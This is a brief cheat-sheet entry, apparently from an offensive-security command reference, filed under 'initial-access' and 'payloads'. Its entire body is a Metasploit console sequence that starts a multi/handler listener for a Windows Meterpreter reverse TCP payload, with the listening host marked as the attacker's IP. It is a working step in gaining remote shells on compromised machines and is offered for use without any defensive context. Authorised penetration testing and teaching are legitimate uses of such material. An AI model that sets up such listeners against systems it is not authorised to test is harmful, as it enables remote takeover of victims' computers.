---
title: Metasploit Multi/Handler Listener
category: initial-access
subcategory: payloads
os: linux
command: msfconsole use exploit/multi/handler
tools: msfconsole
---


### Generic listener setup

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT <port>
run
```
